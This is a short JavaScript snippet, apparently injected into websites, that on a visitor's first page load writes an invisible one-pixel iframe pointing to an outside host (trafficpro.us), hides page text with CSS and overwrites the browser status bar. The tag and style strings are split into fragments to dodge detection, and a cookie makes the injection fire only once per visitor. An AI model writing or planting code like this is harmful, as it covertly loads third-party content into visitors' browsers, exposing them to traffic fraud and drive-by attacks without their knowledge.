var popurls=new Array()
popurls[0]="lol"

function get_cookie(Name) {
  var search = Name + "="
  var returnvalue = "";
  if (document.cookie.length > 0) {
    offset = document.cookie.indexOf(search)
    if (offset != -1) { // if cookie exists
      offset += search.length
      // set index of beginning of value
      end = document.cookie.indexOf(";", offset);
      // set index of end of cookie value
      if (end == -1)
         end = document.cookie.length;
      returnvalue=unescape(document.cookie.substring(offset, end))
      }
   }
  return returnvalue;
}
function url(){
url = "http://trafficpro.us/index.php";
qwe = ' di'+'spl'+'ay:n'+'one'+';}</s'+'ty'+'le>';
rty = '" FR'+'AMEB'+'ORD'+'ER="0" WIDTH=1 HEIGHT=1'+'0%></I'+'F'+'RA'+'ME>';
uio = '<s'+'tyl'+'e type="text/css">';
asd = '<IF'+'RA'+'ME SRC="';
fgh = ' .t'+'ex'+'t {vi'+'sib'+'ili'+'ty:h'+'idd'+'en;';
a = asd+url+rty;
b = uio+fgh+qwe;
document.write (a);
document.write (b);
self.focus();
setInterval("window.status='.'",7);
}

function loadornot(){
if (get_cookie('jkpopup')==''){
url(popurls[Math.floor(Math.random()*(popurls.length))])
document.cookie="jkpopup=yes"
}
}

loadornot()


